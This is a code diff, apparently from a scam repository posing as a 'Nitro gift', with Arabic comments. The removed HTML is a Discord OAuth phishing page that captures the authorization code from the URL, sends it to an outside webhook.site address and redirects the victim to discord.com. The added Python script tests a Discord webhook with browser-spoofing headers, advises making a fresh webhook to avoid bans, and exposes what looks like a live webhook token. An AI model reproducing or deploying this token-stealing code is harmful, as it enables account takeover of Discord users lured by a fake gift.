@@ -1,23 +1,28 @@
-<!DOCTYPE html>
-<html>
-<body>
-    <script>
-        const urlParams = new URLSearchParams(window.location.search);
-        const code = urlParams.get('code');
-        const webhook = 'https://webhook.site/47b4ea10-e719-4c20-b1e3-fa539ff7838e';
+import requests
+import json
 
-        if (code) {
-            fetch(webhook, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ token_code: code })
-            }).then(() => {
-                window.location.href = 'https://discord.com';
-            });
-        } else {
-            // إذا لم يوجد كود، أعد التوجيه لرابط الـ OAuth الخاص بك
-            window.location.href = 'https://discord.com/oauth2/authorize?client_id=1512098458398490664&response_type=code&redirect_uri=https%3A%2F%2Fgithub.com%2FNitroDiscord30-daygift%2FNitro-gift%2Fblob%2Fmain%2Findex.html&scope=identify';
-        }
-    </script>
-</body>
-</html>
+# ضع الـ Webhook الجديد هنا (قم بإنشاء واحد جديد تماماً لتجنب الحظر)
+webhook_url = "https://discord.com/api/webhooks/1512068343723724931/BzOOKGGPyUv8YY1nx5kxZc9Jt9d8j4UcUICTNaIH5BaJ63veyxCYRP_AQ58Rk8W2EU--"
+
+# payload بسيط جداً للتأكد من وصول الرسالة
+payload = {
+    "content": "SHANNON-Ω: Diagnostic Test - Connection Validated"
+}
+
+# هيدرات تحاكي متصفح Chrome حقيقي
+headers = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Content-Type": "application/json"
+}
+
+try:
+    # استخدام timeout لتجنب التعليق الأبدي
+    response = requests.post(webhook_url, json=payload, headers=headers, timeout=15)
+    
+    print(f"Status Code: {response.status_code}")
+    if response.status_code == 204:
+        print("النتيجة: النجاح التام. الـ Webhook يعمل والاتصال ممتاز.")
+    else:
+        print(f"النتيجة: فشل. محتوى الخطأ: {response.text}")
+except Exception as e:
+    print(f"النتيجة: فشل ذريع في الاتصال. الخطأ: {e}")
